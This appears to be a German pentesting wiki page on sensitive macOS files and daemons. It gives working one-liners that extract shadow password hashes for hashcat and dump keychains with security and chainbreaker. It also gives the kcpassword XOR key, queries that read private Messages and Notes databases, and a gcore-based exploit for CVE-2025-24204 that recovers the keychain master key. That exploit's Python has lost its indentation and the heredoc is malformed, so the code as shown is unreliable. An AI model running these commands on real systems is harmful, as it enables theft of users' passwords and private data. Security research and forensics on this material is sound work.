# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Passwörter

### Schattenpasswörter

Das Schattenpasswort wird zusammen mit der Konfiguration des Benutzers in Plists unter **`/var/db/dslocal/nodes/Default/users/`** gespeichert.\
Mit dem folgenden oneliner können **alle Informationen über die Benutzer** (einschließlich Hash-Informationen) ausgelesen werden:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skripte wie dieses**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) oder [**dieses hier**](https://github.com/octomagon/davegrohl.git) können verwendet werden, um den Hash in das **hashcat**-**Format** umzuwandeln.

Ein alternativer One-Liner, der die Credentials aller Nicht-Service-Accounts im hashcat-Format `-m 7100` (macOS PBKDF2-SHA512) ausgibt:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Eine weitere Möglichkeit, die `ShadowHashData` eines Benutzers zu erhalten, besteht in der Verwendung von `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Diese Datei wird **nur** verwendet, wenn das System im **Single-User-Modus** läuft (also nicht sehr häufig).

### Keychain Dump

Beachte, dass bei der Verwendung der security-Binary zum **Dumpen der entschlüsselten Passwörter** mehrere Eingabeaufforderungen angezeigt werden, in denen der Benutzer diesen Vorgang erlauben muss.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Auf modernen macOS-Systemen sind die interessantesten zugrunde liegenden Speicher normalerweise **`~/Library/Keychains/login.keychain-db`** und **`/Library/Keychains/System.keychain`**. Dabei handelt es sich um SQLite-basierte Dateien, der Zugriff auf Klartext wird jedoch weiterhin durch **`securityd`** vermittelt: Der Diebstahl der reinen Datenbank liefert hauptsächlich Metadaten und verschlüsselte Blobs, sofern nicht zusätzlich das Passwort des Benutzers, `SystemKey` oder ein Master Key aus dem Speicher wiederhergestellt wird.<sup>[2]</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Basierend auf diesem Kommentar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) scheint es, dass diese Tools in Big Sur nicht mehr funktionieren.

### Überblick über Keychaindump

Ein Tool namens **keychaindump** wurde entwickelt, um Passwörter aus macOS-Keychains zu extrahieren. Es unterliegt jedoch Einschränkungen bei neueren macOS-Versionen wie Big Sur, wie in einer [Diskussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) beschrieben. Die Verwendung von **keychaindump** setzt voraus, dass der Angreifer Zugriff erlangt und seine Privilegien auf **root** erweitert. Das Tool nutzt die Tatsache aus, dass die Keychain standardmäßig bei der Benutzeranmeldung entsperrt wird, um den Zugriff für Anwendungen zu erleichtern, ohne wiederholt das Passwort des Benutzers anzufordern. Entscheidet sich ein Benutzer jedoch dafür, seine Keychain nach jeder Verwendung zu sperren, wird **keychaindump** wirkungslos.

**Keychaindump** zielt auf einen bestimmten Prozess namens **securityd**, den Apple als Daemon für Autorisierungs- und kryptografische Vorgänge beschreibt und der für den Zugriff auf die Keychain entscheidend ist. Der Extraktionsprozess umfasst die Identifizierung eines **Master Key**, der aus dem Anmeldepasswort des Benutzers abgeleitet wurde. Dieser Schlüssel ist erforderlich, um die Keychain-Datei zu lesen. Um den **Master Key** zu finden, durchsucht **keychaindump** den Speicher-Heap von **securityd** mithilfe des Befehls `vmmap` nach potenziellen Schlüsseln in Bereichen, die als `MALLOC_TINY` gekennzeichnet sind. Der folgende Befehl wird verwendet, um diese Speicherbereiche zu untersuchen:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nach der Identifizierung potenzieller Master Keys durchsucht **keychaindump** die Heaps nach einem bestimmten Muster (`0x0000000000000018`), das auf einen Kandidaten für den Master Key hinweist. Weitere Schritte, einschließlich der Deobfuscation, sind erforderlich, um diesen Key zu verwenden, wie im Quellcode von **keychaindump** beschrieben. Analysten, die sich auf diesen Bereich konzentrieren, sollten beachten, dass die für die Entschlüsselung des Keychains entscheidenden Daten im Speicher des Prozesses **securityd** gespeichert sind. Ein Beispielbefehl zum Ausführen von **keychaindump** lautet:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kann verwendet werden, um die folgenden Arten von Informationen aus einem OSX-Keychain forensisch korrekt zu extrahieren:

- Gehashtes Keychain-Passwort, geeignet zum Cracking mit [hashcat](https://hashcat.net/hashcat/) oder [John the Ripper](https://www.openwall.com/john/)
- Internet-Passwörter
- Allgemeine Passwörter
- Private Keys
- Public Keys
- X509-Zertifikate
- Sichere Notizen
- Appleshare-Passwörter

Mit dem Keychain-Entsperrpasswort, einem mithilfe von [volafox](https://github.com/n0fate/volafox) oder [volatility](https://github.com/volatilityfoundation/volatility) erlangten Master Key oder einer Unlock-Datei wie SystemKey kann Chainbreaker außerdem Passwörter im Klartext bereitstellen.

Ohne eine dieser Methoden zum Entsperren des Keychain zeigt Chainbreaker alle anderen verfügbaren Informationen an.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Keychain-Schlüssel (mit Passwörtern) mit SystemKey dumpen**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain-Schlüssel dumpen (mit Passwörtern) und den Hash knacken**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain-Schlüssel (mit Passwörtern) mit einem Memory Dump dumpen**

[Follow these steps](../index.html#dumping-memory-with-osxpmem), um einen **Memory Dump** durchzuführen.
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain-Schlüssel (mit Passwörtern) mithilfe des Benutzerpassworts dumpen**

Wenn du das Passwort des Benutzers kennst, kannst du es verwenden, um **Keychains zu dumpen und zu entschlüsseln, die dem Benutzer gehören**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain-Master-Key via `gcore`-Entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) wurde mit `/usr/bin/gcore` und dem **`com.apple.system-task-ports.read`**-Entitlement ausgeliefert, sodass jeder lokale Admin (oder eine bösartige signierte App) **den Speicher jedes Prozesses dumpen konnte, selbst wenn SIP/TCC erzwungen wurden**. Das Dumpen von `securityd` legt den **Keychain-Master-Key** im Klartext offen und ermöglicht es, `login.keychain-db` ohne das Benutzerpasswort zu entschlüsseln.<sup>[1]</sup>

**Schneller Repro auf verwundbaren Builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Führe den extrahierten Hex-Schlüssel an Chainbreaker (`--key <hex>`) weiter, um den login keychain zu entschlüsseln. Apple hat das entitlement in **macOS 15.3+** entfernt, daher funktioniert dies nur auf ungepatchten Sequoia-Builds oder Systemen, auf denen die verwundbare Binary erhalten geblieben ist.

### kcpassword

Die Datei **kcpassword** enthält das **Login-Passwort des Benutzers**, jedoch nur, wenn der Besitzer des Systems **automatisches Login aktiviert** hat. Daher wird der Benutzer automatisch angemeldet, ohne nach einem Passwort gefragt zu werden (was nicht besonders sicher ist).

Das Passwort wird in der Datei **`/etc/kcpassword`** gespeichert und mit dem Schlüssel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** per XOR verschlüsselt. Wenn das Passwort des Benutzers länger als der Schlüssel ist, wird der Schlüssel wiederverwendet.\
Dadurch lässt sich das Passwort ziemlich einfach wiederherstellen, beispielsweise mit Scripts wie [**diesem hier**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interessante Informationen in Datenbanken

### Nachrichten
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Benachrichtigungen

Vor **Sequoia** finden Sie den Speicher des Notification Center normalerweise unter **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. In **Sequoia+** hat Apple ihn in den TCC-geschützten Group Container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** verschoben.

Die meisten interessanten Informationen werden in **blob**-Spalten gespeichert. Daher müssen Sie diesen Inhalt extrahieren und in ein für Menschen lesbares Format umwandeln (`plutil -p -`, `strings` oder einen kleinen Parser). Beispiele für eine schnelle Triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Aktuelle Datenschutzprobleme (NotificationCenter DB)

- In macOS **14.7–15.1** speicherte Apple Banner-Inhalte in der `db2/db` SQLite-Datenbank ohne ausreichende Schwärzung. Die CVEs **CVE-2024-44292/44293/40838/54504** ermöglichten es jedem lokalen Benutzer, den Benachrichtigungstext anderer Benutzer allein durch das Öffnen der DB zu lesen (keine TCC-Abfrage).
- Apple entschärfte dies, indem die DB in `group.com.apple.usernoted` verschoben und auf neueren Sequoia-Builds mit TCC geschützt wurde. Daher benötigt man auf aktuellen Systemen normalerweise den richtigen Benutzerkontext oder einen TCC bypass, um sie zu lesen.<sup>[3]</sup>
- Auf älteren Systemen sollten die Dateien `db`, `db-wal` und `db-shm` gemeinsam kopiert werden, bevor ein Update oder Neustart durchgeführt wird, wenn die Artefakte erhalten bleiben sollen.

### Hinweise

Die **Notizen** der Benutzer befinden sich in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Wenn der obige One-Liner zu viele Ausgaben erzeugt, exportiere `ZICNOTEDATA.ZDATA`, entpacke es mit gunzip und parse das protobuf: Das ist normalerweise zuverlässiger, als `strings` direkt auf der SQLite-Datenbank auszuführen.

### Hintergrundaufgaben / Login Items

Seit **Ventura** werden vom Benutzer genehmigte Login Items und mehrere Hintergrundaufgaben in **BTM**-Stores erfasst, beispielsweise in **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** und im versionierten System-Cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Diese Dateien sind nützlich, um schnell Persistenz, Helper-Tools und einige von MDM verwaltete Hintergrund-Items zu identifizieren:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Für den Persistence-Aspekt und die BTM-Interna siehe [die Seite zu Auto-Start-Speicherorten](../../macos-auto-start-locations.md#login-items) und [die Hinweise zu Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Einstellungen

In macOS befinden sich die Einstellungen von Apps in **`$HOME/Library/Preferences`** und in iOS in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Unter macOS kann das CLI-Tool **`defaults`** verwendet werden, um die **Preferences-Datei zu ändern**.

**`/usr/sbin/cfprefsd`** beansprucht die XPC-Services `com.apple.cfprefsd.daemon` und `com.apple.cfprefsd.agent` und kann aufgerufen werden, um Aktionen wie das Ändern von Einstellungen auszuführen.

## OpenDirectory permissions.plist

Die Datei `/System/Library/OpenDirectory/permissions.plist` enthält Berechtigungen, die auf Node-Attribute angewendet werden, und ist durch SIP geschützt.\
Diese Datei gewährt bestimmten Benutzern anhand ihrer UUID (und nicht anhand ihrer uid) Berechtigungen, damit sie auf bestimmte vertrauliche Informationen wie `ShadowHashData`, `HeimdalSRPKey` und `KerberosKeys` sowie weitere zugreifen können:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Systembenachrichtigungen

### Darwin-Benachrichtigungen

Der wichtigste Daemon für Benachrichtigungen ist **`/usr/sbin/notifyd`**. Um Benachrichtigungen zu empfangen, müssen sich Clients über den Mach-Port `com.apple.system.notification_center` registrieren (überprüfe sie mit `sudo lsmp -p <pid notifyd>`). Der Daemon wird mit der Datei `/etc/notify.conf` konfiguriert.

Die für Benachrichtigungen verwendeten Namen sind eindeutige Reverse-DNS-Bezeichnungen. Wenn eine Benachrichtigung an einen dieser Namen gesendet wird, erhalten die Clients, die angegeben haben, dass sie diese verarbeiten können, die Benachrichtigung.

Der aktuelle Status (einschließlich aller Namen) kann ausgegeben werden, indem das Signal SIGUSR2 an den notifyd-Prozess gesendet und die generierte Datei gelesen wird: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Das **Distributed Notification Center**, dessen Haupt-Binary **`/usr/sbin/distnoted`** ist, bietet eine weitere Möglichkeit, Benachrichtigungen zu senden. Es stellt einige XPC services bereit und führt einige Prüfungen durch, um zu versuchen, Clients zu verifizieren.

### Apple Push Notifications (APN)

In diesem Fall können sich Anwendungen für **topics** registrieren. Der Client generiert ein Token, indem er über **`apsd`** Kontakt zu den Apple-Servern aufnimmt.\
Anschließend haben auch Provider ein Token generiert und können sich mit den Apple-Servern verbinden, um Nachrichten an die Clients zu senden. Diese Nachrichten werden lokal von **`apsd`** empfangen, das die Benachrichtigung an die darauf wartende Anwendung weiterleitet.

Die Preferences befinden sich in `/Library/Preferences/com.apple.apsd.plist`.

Es gibt eine lokale Nachrichtendatenbank, die sich unter macOS in `/Library/Application\ Support/ApplePushService/aps.db` und unter iOS in `/var/mobile/Library/ApplePushService` befindet. Sie enthält 3 Tabellen: `incoming_messages`, `outgoing_messages` und `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Es ist auch möglich, Informationen über den Daemon und Verbindungen abzurufen mit:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Benutzerbenachrichtigungen

Dies sind Benachrichtigungen, die der Benutzer auf dem Bildschirm sehen sollte:

- **`CFUserNotification`**: Diese API bietet eine Möglichkeit, ein Pop-up mit einer Nachricht auf dem Bildschirm anzuzeigen.
- **The Bulletin Board**: Dies zeigt unter iOS ein Banner an, das verschwindet und im Notification Center gespeichert wird.
- **`NSUserNotificationCenter`**: Dies ist das iOS-Bulletin-Board unter macOS. In älteren macOS-Versionen befindet sich die Datenbank normalerweise unter `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; unter Sequoia+ wurde sie nach `~/Library/Group Containers/group.com.apple.usernoted/db2/db` verschoben.

## Referenzen

- [1] [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
